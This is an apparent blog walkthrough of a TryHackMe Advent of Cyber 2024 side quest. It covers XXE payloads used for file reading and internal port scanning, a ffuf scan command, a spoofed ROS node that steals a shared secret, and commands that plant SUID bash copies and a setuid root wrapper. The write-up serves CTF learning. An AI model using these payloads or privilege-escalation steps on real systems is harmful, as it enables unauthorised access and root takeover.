---
title: AoC 24' Side Quest - Task 2 - TryHackMe - Walkthrough
date: 2024-12-28 08:00:00 +0200
categories: [TryHackMe]
tags: [ros, privesc]
description: Exploit a robot system.
image:
  path: /assets/blog/sidequest241/Room.png
  alt: The suspect.
---

## Description

This is a WriteUp to the second Side Quest Challenge, <https://tryhackme.com/r/room/adventofcyber24sidequest>, of the TryHackMe Advent of Cyber.

> It was the night before the Best Festival Company’s annual holiday production run, and their state-of-the-art robotic duo, YIN and YANG, were the pride of the operation. YIN handled precision crafting with unrivalled finesse, while YANG managed mass production at breathtaking speed. Together, they kept the toy lines humming, spreading joy to millions.  
>   
> But in the shadows of the icy Arctic night, **Penguin Zero**, the tech genius of the Frostlings Five, had other plans.  
> 
> **The Hack**
> 
> Using his signature cybernetic "Frost Override," Penguin Zero infiltrated the company’s network. With a few keystrokes and a sly grin, he uploaded a malicious script into YIN and YANG, seizing control of the robotic pair. Production came to an abrupt halt as the machines began churning out nothing but frozen figurines of the Frostlings Five. Their icy grins mocked the frantic elves, scrambling to regain control.
> 
> But YIN and YANG were designed to operate in perfect harmony, sharing critical data through an encrypted feedback loop. Penguin Zero, knowing the encryption's complexity, left a chilling message for the company: _**"Balance is key. Can you find it before your deadline melts away?"**_  
> 
> **The Challenge**
> 
> Hacking YIN without YANG would result in corrupted files, rendering YIN useless. Similarly, hacking YANG without YIN would cause a fatal system error. The encryption tethered their systems in a perfect symbiosis. They communicate using the [language of turtle robots](https://www.ros.org/).

## The keycard

You can find the keycard for this challenge in the challenge of the fifth day. To find the keycard we need to exploit **XXE** (XML External Entity). The hint in the last question/instruction of this day gives us the hint to search for open ports.

> "*Following McSkidy's advice, Software recently hardened the server. It used to have many unneeded open ports, but not anymore. Not that this matters in any way.*" 

The first thing I did is taking the request used for LFI from XXE and modified it to make a port scanner for internal ports...

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

to:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "http://127.0.0.1:FUZZ/"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

Now I saved the whole request to a file to use it for scanning for a port.

**Full request for the port scanner**
```
POST /wishlist.php HTTP/1.1
Host: 10.10.191.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.191.67/product.php?id=1
Content-Type: application/xml
Content-Length: 204
Origin: http://10.10.191.67
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=ohusg1pv09frqrgkcgtagfrogp
Priority: u=0


<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "http://127.0.0.1:FUZZ/"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```
{: file='port_scanner.txt'}

I now used `fuff` to scan for the open ports. I used `seq` to create a list of numbers in the command.

```sh
ffuf -request port_scanner.txt -request-proto http -w <(seq 1 65537)  -fs 19
```

![](/assets/blog/sidequest241/port0.png)
Interestingly enough only the mysql port for the database showed up. I already had access to this and didn't find anything useful in it.

> **Note:** You can leak the database password and username because I fuzzed for the database file, I extracted it with `php://filter/convert.base64-encode/resource=file:///var/www/html/conn.php`, because the XXE wouldn't show me PHP. The next thing I found was that `/phpmyadmin` was running, with that I could login to the database and check for data, but this didn't help me. In addition to that I tried command execution and file writing to get RCE over the database.
{: .prompt-tip }

The result didn't help us to make progress. I first thought that there really are no other ports open, but then I realized that maybe the target port is filtered. So I added `base64` encoding to the request to escape any filters or other protections. Then I executed the same command again.

```xml
[...]
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://127.0.0.1:FUZZ/"> ]>
<wishlist>
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```
{: file='port_scanner.txt'}

This result looks more promising, we now get three internal ports open.

![](/assets/blog/sidequest241/port1.png)

I requested the page now in BurpSuite.

![](/assets/blog/sidequest241/burp.png)

I decoded the `base64` in the terminal:

![](/assets/blog/sidequest241/page.png)

The page looks like a directory listing in Apache2, we can see a `access.log` which shows the requested URIs in Apache2. This may could leak the URI for the keycard.

I now requested `http://127.0.0.1:8080/access.log` with the `base64` wrapper and got this one single entry which is apparently the location of the keycard.

```
10.13.27.113 - - [18/Nov/2024:14:43:35 +0000] "GET /k3yZZZZZZZZZ/t2_sm1L3_4nD_w4v3_boyS.png HTTP/1.1" 200 194 "http://10.10.218.19/product.php?id=1" "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
{: file='access.log'}

We can now request the keycard on the server op port 80.

![](/assets/blog/sidequest241/kk.png)


## Unlock the server

I first did a `nmap` scan on both servers.
They both look similar, but you can't login to ssh. They both have port 21337 open. This port looks like a ransomware page.

```
PORT      STATE SERVICE
21337/tcp open  unknown
```

You can enter the password from the keycard here to "decrypt" the server. After that you can use `ssh` to log into ssh.

![](/assets/blog/sidequest241/encrypt.png)

You can do the same for Yin & Yang.

## Break Yin

The first thing I did is running `sudo -l`, because we already have a shell on the machine we likely need to do privilege escalation.

```
yin@ip-10-10-154-73:~$ sudo -l
Matching Defaults entries for yin on ip-10-10-154-73:
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    always_set_home

User yin may run the following commands on ip-10-10-154-73:
    (root) NOPASSWD: /catkin_ws/yin.sh
```
{: file='yin'}


We can execute s script named `yin.sh`, if we inspect the script, we can conclude that it starts the ROS node.

```sh
#!/usr/bin/bash

source /opt/ros/noetic/setup.bash
source /catkin_ws/devel/setup.bash

rosrun yin runyin.py
```
{: file='yin.sh'}

> **Note:** Before starting this challenge I recommend watching [the first 5 YouTube videos](https://youtube.com/playlist?list=PLLSegLrePWgIbIrA4iehUQ-impvIXdd9Q&feature=shared) from the playlist. I watched them in double speed and they gave me a rough understanding of how to work with this system.
{: .prompt-warning }

After understanding that we have two ROS notes (yin and yang) I investigated the structure and the python script. We have a `/catkin_ws` directory which is like the base. In this directory we have a secret and a private key.

```
yang@ip-10-10-97-42:/catkin_ws$ ls -la
-rw-r--r--  1 root root   98 Dec  4 04:28 .catkin_workspace
drwxr-xr-x 10 root root 4096 Dec  4 04:33 build
drwxr-xr-x  5 root root 4096 Dec  4 04:31 devel
-rwx------  1 root root 2523 Dec  4 04:31 privatekey.pem
-rwx------  1 root root   40 Dec  4 04:31 secret.txt
drwxr-xr-x  3 root root 4096 Dec  4 04:30 src
-rwxr-xr-x  1 root root  141 Dec  4 04:32 start-yang.sh
-rwxr-xr-x  1 root root  110 Dec  4 04:32 yang.sh
```
{: file='yang'}

The same is the case on yin.
```
yin@ip-10-10-154-73:/catkin_ws$ ls -la
-rw-r--r--  1 root root   98 Dec  4 04:18 .catkin_workspace
drwxr-xr-x 10 root root 4096 Dec  4 04:23 build
drwxr-xr-x  5 root root 4096 Dec  4 04:21 devel
-rwx------  1 root root 2522 Dec  4 04:22 privatekey.pem
-rwx------  1 root root   40 Dec  4 04:22 secret.txt
drwxr-xr-x  3 root root 4096 Dec  4 04:19 src
-rwxr-xr-x  1 root root  141 Dec  4 04:26 start-yin.sh
-rwxr-xr-x  1 root root  108 Dec  4 04:25 yin.sh
```
{: file='yin'}

I now went for the python scripts on both servers which are in `/catkin_ws/src/yin/script` and `/catkin_ws/src/yang/script`. 

Before moving forward I noticed that we didn't even tested the two notes and I was interested in how they communicate.

Apparently they can't communicate, I started both servers and got this answer:

```
yang@ip-10-10-97-42:/catkin_ws/src/yang/scripts$ sudo /catkin_ws/yang.sh
[ERROR] [1735575563.178497]: Unable to immediately register with master node [http://localhost:11311]: master may not be running yet. Will keep trying.
```

So I had to make them somehow to communicate. My first approach was changing the environment variable `ROS_MASTER_URI`. But wait, for that we need a master. So I first build a ROS master node, I did that in `docker` so my attacker machine wouldn't get damaged in the process.

```Dockerfile
# Use an official ROS base image
FROM docker.io/ros:noetic

# Install required packages
RUN apt-get update && apt-get install -y \
    net-tools \
    iputils-ping \
    && rm -rf /var/lib/apt/lists/*

# Set up the ROS environment
SHELL ["/bin/bash", "-c"]
RUN echo "source /opt/ros/noetic/setup.bash" >> ~/.bashrc

# Define the default command to run roscore
CMD ["roscore"]
```

Then I build the container and started it. You can test if the server works with curling your localhost.

Note: You need the network host to expose the port right.

```sh
sudo docker build -t ros-master-server .
sudo docker run -it --name ros-master-server --net=host ros-master-server
curl http://localhost:11311/
```

The next challenge was to get the nodes to communicate with the master, I noticed that we can't modify the environment variable, but.. there is another solution for this problem port 11311 can be demanded even by users, so my idea is to make a port forward (this time backwards). I ssh'ed a second time into the server so I now had 4 windows with shells open...

First start ssh on your attacker machine.
```sh
sudo systemctl start ssh.service
```

I now ssh'ed back into my attacker machine from both nodes.
```sh
ssh -L 11311:localhost:11311 user@10.14.78.229
```

Now both machines started the server script flawlessly. The next thing we need to do is find a vulnerability in the communication. I noticed that the server yin is accepting the request only with the secret, the yang server uses signing for the communication. Moreover the yin server executes every command just with this secret.

```python
    def handle_yang_request(self, req):
        # Check secret first
        if req.secret != self.secret:
            return "Secret not valid"

        sender = req.sender
        receiver = req.receiver
        action = req.command

        os.system(action)
```

The next question is how we can get this secret, as you might saw, we can't simply read the file with the secret. We somehow need to intercept it. I noticed that the yang server tries to access the service which executes the command on yin if we send him a ping, however this ping needs to be signed. So that this exploit successfully works we need to use the real yin server to send a request and then fast enough switch to our enemy server which will print the secret key.

I modified the yin script to that:
```python
#!/usr/bin/python3

import rospy
import codecs
import os
from std_msgs.msg import String
from yin.msg import Comms
from yin.srv import yangrequest
import hashlib

class Yin:
    def __init__(self):
        
        self.messagebus = rospy.Publisher('messagebus', Comms, queue_size=50)


        #Read the message channel private key
        pwd = b'secret'

        self.priv_key_str = pwd.decode()

        rospy.init_node('yin')

        self.prompt_rate = rospy.Rate(0.5)

        self.secret = pwd.decode()
        self.service = rospy.Service('svc_yang', yangrequest, self.handle_yang_request)

    def handle_yang_request(self, req):
        print(req.secret)

    def run_yin(self):
        while not rospy.is_shutdown():
            self.prompt_rate.sleep()

if __name__ == '__main__':
    try:
        yin = Yin()
        yin.run_yin()

    except rospy.ROSInterruptException:
        pass
```

In order to break yin we need to initialize a new package. I firstly went to the home dir and executed these commands.

```sh
mkdir catkin_ws
catkin_ws/
mkdir src
catkin_make
cd src
catkin_create_pkg yin rospy
cd yin
cp -r /catkin_ws/src/yin/* .
```

Next I replaced the script `runyin.py` with the script I made.

Finally I compiled the program:
```
cd ~/catkin_ws/
catkin_make
```

Finally we need to load the ros source:
```
source devel/setup.sh 
```

With that we could start our server. To get the yang node to connect to our malicious node we need start the legitimate yin node first, then we need to start the yang node. Then start the malicious yin node with some trial and error you should get the secret key.

![](/assets/blog/sidequest241/trialerror.png)

Now it's time to hack "ourself" to get root, because we can use our new node to connect to yin from yin.

I modified the script from the package we already have.
```python
#!/usr/bin/python3

import rospy
import codecs
import os
from std_msgs.msg import String
from yin.msg import Comms
from yin.srv import yangrequest

class Yin:
    def __init__(self):
        self.messagebus = rospy.Publisher('messagebus', Comms, queue_size=50)
        rospy.init_node('doesntmatter')
        self.secret = "thisisasecretvaluethatyouwillneverguess"
        self.prompt_rate = rospy.Rate(0.5)

    
    def yin_request(self):
        resp = ""
        rospy.wait_for_service('svc_yang')
        print("Sending request")
        try:
            service = rospy.ServiceProxy('svc_yang', yangrequest)
            response = service(self.secret, 'cp /bin/bash /home/yin/bash && chmod +s /home/yin/bash', 'Yang', 'Yin')
        except rospy.ServiceException as e:
            print ("Failed: %s"%e)

    def run_yin(self):
        self.yin_request()
        while not rospy.is_shutdown():
            self.prompt_rate.sleep()

if __name__ == '__main__':
    try:
        yin = Yin()
        yin.run_yin()

    except rospy.ROSInterruptException:
        pass
```

Now we successfully made a SUID shell.

```terminal
yin@ip-10-10-154-73:~/catkin_ws/src/yin/scripts$ ls ~
bash  catkin_ws  where-to-find-yang.txt  yang.txt
```

So I now am root on yin and can print the flag.

```terminal
bash-5.0# cat yin.txt 
THM{Yin.################################################.Yang}
```

The next thing to hack yang is to upgrade my SUID shell to a better shell I used this program to set not only the `euid` but the `uid` to 0.
```c
#include <unistd.h>
int main() {
    setuid(0); // Sets the real and effective UID to root
    execl("/bin/sh", "sh", NULL);
    return 0;
}
```
{: file='real.c'}

If you compile it with `gcc real.c -o real` and then execute it as root you will get the right suid you can now run `/bin/bash` and edit the `/catkin_ws/src/yin/scripts/runyin.py` file.

## Break Yang

You need to modify these lines inside the `craft_ping()` function:
```python
[...]
        # message.actionparams = ['touch /home/yang/yin.txt']
        # to something like
        message.actionparams = ['cp /bin/bash /home/yang/bash && chmod +s /home/yang/bash']
[...]
```

Then restart both nodes and you should get a SUID shell on yang.
```terminal
yang@ip-10-10-97-42:~$ ls
bash  yin.txt
```

Finally you can retrieve the flag.
```terminal
bash-5.0# cat yang.txt 
THM{Yang.################.su#####}
```

I really liked this challenge and that you need to forge a whole application to get the flag.